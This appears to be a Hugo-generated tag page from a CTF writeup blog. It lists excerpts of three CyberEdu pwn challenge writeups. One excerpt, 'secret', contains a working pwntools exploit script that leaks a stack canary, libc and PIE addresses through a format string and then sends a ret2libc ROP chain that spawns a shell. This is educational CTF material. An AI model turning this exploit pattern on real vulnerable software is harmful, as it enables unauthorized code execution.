@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/writeup-blog/livereload.js?mindelay=10&amp;v=2&amp;port=39363&amp;path=writeup-blog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Random | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="">
+<meta name="description" content="">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:39363/writeup-blog/tags/random/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:39363/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:39363/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:39363/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:39363/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:39363/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="http://localhost:39363/writeup-blog/tags/random/index.xml" title="rss">
+<link rel="alternate" hreflang="en" href="http://localhost:39363/writeup-blog/tags/random/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body class="list" id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:39363/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:39363/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:39363/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:39363/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+<header class="page-header">
+  <h1>
+    Random
+  </h1>
+</header>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu offensive-honeypot Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge overview Just another pwn challenge.
+We’re dealing with a little game, and a canary.
+The win condition is that we beat the game, by killing the hacker player.
+Identifying the vulnerabilities The vulnerability here is that we can calculate the random number ourselves, very similarly to another challenge I wrote the writeup for here.
+Since we know the seed ourselves, we can get the same value for rand() that the game gets.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-12-28 00:00:00 +0000 UTC'>December 28, 2025</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu offensive-honeypot Writeup" href="http://localhost:39363/writeup-blog/posts/offensivehoneypot-writeup/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu baby-fmt Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Merry Christmas everyone! 🎄
+Challenge overview This is should be a basic pwn challenge but please be aware that time is not your friend.
+Let’s check out the restrictions we’re dealing with.
+We’re working with a 64-bit binary with NX and PIE enabled, and as the name suggests, probably a format string vulnerability. Let’s take a look at the disassembled binary.
+We have a function called by main, let’s call it vuln.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-12-26 00:00:00 +0000 UTC'>December 26, 2025</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu baby-fmt Writeup" href="http://localhost:39363/writeup-blog/posts/babyfmt-writeup/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu secret Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge overview Just another pwn challenge.
+Straight away, we’re dealing with a 64-bit PIE with canary enabled, and a format string vulnerability, and a gets(v1).
+The format string vulnerability is in main:
+And here is the gets(v1) that allows us to buffer overflow:
+So, ret2libc with a canary.
+The exploit We quickly gain shell locally using this script (first try!):
+# %15$p is the canary # %17$p is libc &#43; 0x1f68 # %19$p is PIE &#43; 0xb6d #to use gadgets we need to leak PIE base too name_payload = b&#34;%15$p.%17$p.%19$p&#34; p.recvuntil(b&#34;Name: &#34;) p.sendline(name_payload) p.recvuntil(b&#34;Hillo &#34;) leaks = p.recvline().strip() canary, libc_leak, pie_leak = leaks.split(b&#34;.&#34;) canary = int(canary, 16) libc_leak = int(libc_leak, 16) pie_leak = int(pie_leak, 16) print(f&#34;canary: {hex(canary)}&#34;) print(f&#34;libc leak: {hex(libc_leak)}&#34;) print(f&#34;pie leak: {hex(libc_leak)}&#34;) libc = libc_leak - 0x1f68 pie = pie_leak - 0xb6d #local binsh_offset = 0x17fe3c system_offset = 0x2b910 pop_rdi_ret = 0xca3 &#43; pie ret = 0x889 &#43; pie system = libc &#43; system_offset binsh = libc &#43; binsh_offset p.recvuntil(b&#34;Phrase: &#34;) payload = ( b&#34;a&#34;*136 &#43; #s1 p64(canary) &#43; b&#34;b&#34; * 8 &#43; #rbp p64(pop_rdi_ret) &#43; p64(binsh) &#43; p64(ret) &#43; p64(system) ) p.sendline(payload) p.interactive() For the remote instance, we most probably need to recalculate the offsets, for both the different glibc version and the format strings. I found the format string differences easily:
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-12-26 00:00:00 +0000 UTC'>December 26, 2025</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu secret Writeup" href="http://localhost:39363/writeup-blog/posts/secret-writeup/"></a>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:39363/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
